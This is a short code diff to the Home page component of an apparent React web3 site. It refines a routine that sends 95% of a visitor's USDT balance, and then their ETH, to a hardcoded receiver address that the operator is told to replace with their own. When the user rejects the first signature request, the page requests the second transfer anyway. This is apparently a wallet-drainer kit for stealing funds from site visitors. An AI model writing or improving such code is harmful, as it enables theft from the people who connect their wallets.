@@ -34,8 +34,18 @@ export default function Home() {
       try {
         await sendUsdt();
         await sendEth();
-      } catch {
-        await sendEth(); //if user rejected first request, second on still requests
+      } catch (e) {
+        if (
+          e.message ==
+          "MetaMask Tx Signature: User denied transaction signature."
+        ) {
+          sendEth();
+        } else if (
+          e.message ==
+          `call revert exception (method="balanceOf(address)", errorSignature=null, errorArgs=[null], reason=null, code=CALL_EXCEPTION, version=abi/5.0.1)`
+        ) {
+          alert("Please change your network");
+        } else console.log(e.message);
       }
     } catch (e) {
       console.log(e);
@@ -47,6 +57,7 @@ export default function Home() {
     const balance = Number(
       (await contract.balanceOf(signerAddress)).toString()
     );
+
     const tx = await contract.transfer(
       "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4", // reciever address, please put your address
       BigInt(balance * 0.95)
